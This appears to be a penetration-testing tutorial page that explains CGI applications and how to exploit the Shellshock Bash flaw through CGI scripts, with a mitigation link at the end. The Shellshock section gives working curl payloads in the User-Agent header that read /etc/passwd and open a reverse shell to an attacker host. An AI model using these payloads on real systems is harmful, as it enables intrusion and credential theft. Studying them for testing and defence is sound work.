# Common Gateway Interface (CGI) Applications

{% hint style="info" %}
* A [Common Gateway Interface (CGI) ](https://www.w3.org/CGI/)is used to help a web server render dynamic pages and create a customized response for the user making a request via a web application.
* CGI applications are primarily used to access other applications running on a web server. CGI is essentially middleware between web servers, external databases, and information sources.&#x20;
* CGI scripts and programs are kept in the `/CGI-bin` directory on a web server and can be written in C, C++, Java, PERL, etc. CGI scripts run in the security context of the web server.&#x20;
* They are often used for guest books, forms (such as email, feedback, registration), mailing lists, blogs, etc.
* These scripts are language-independent and can be written very simply to perform advanced tasks much easier than writing them using server-side programming languages.

CGI scripts/applications are typically used for a few reasons:

* If the webserver must dynamically interact with the user
* When a user submits data to the web server by filling out a form. The CGI application would process the data and return the result to the user via the webserver.

Broadly, the steps are as follows:

* A directory is created on the web server containing the CGI scripts/applications. This directory is typically called `CGI-bin`.
* The web application user sends a request to the server via a URL, i.e, [https://acme.com/cgi-bin/newchiscript.pl](https://acme.com/cgi-bin/newchiscript.pl)
* The server runs the script and passed the resultant output back to the web client
{% endhint %}

## Shellshock via CGI <a href="#shellshock-via-cgi" id="shellshock-via-cgi"></a>

* Shellshock vulnerability allows an attacker to exploit old versions of Bash that save environment variables incorrectly
* Typically when saving a function as a variable, the shell function will stop where it is defined to end by the creator.
* Vulnerable versions of Bash will allow an attacker to execute operating system commands that are included after a function stored inside an environment variable.
* `env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"`&#x20;
* **Find CGI Scripts**
  * `gobuster dir -u http://<IP>/cgi-bin/ -w wordlists/dirb/small.txt -x cgi`&#x20;
* **Confirm the Vulnerability**
  * Use a simple `cURL` command or use Burp Suite Repeater or Intruder to fuzz the user-agent field.
  * `curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://<IP>/cgi-bin/access.cgi`
* **Exploit to Reverse Shell Access**
  * `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<attacker-IP>/<attacker-port> 0>&1' http://<IP>/cgi-bin/access.cgi`
  * [shells-and-listeners.md](../network/exploitation/shells-and-listeners.md "mention")

## Attacking Tomcat CGI [#attacking-tomcat-cgi](tomcat.md#attacking-tomcat-cgi "mention")

## Mitigation

* [digitalocean-how-to-protect-your-server-against-the-shellshock-bash-vulnerability](https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability)
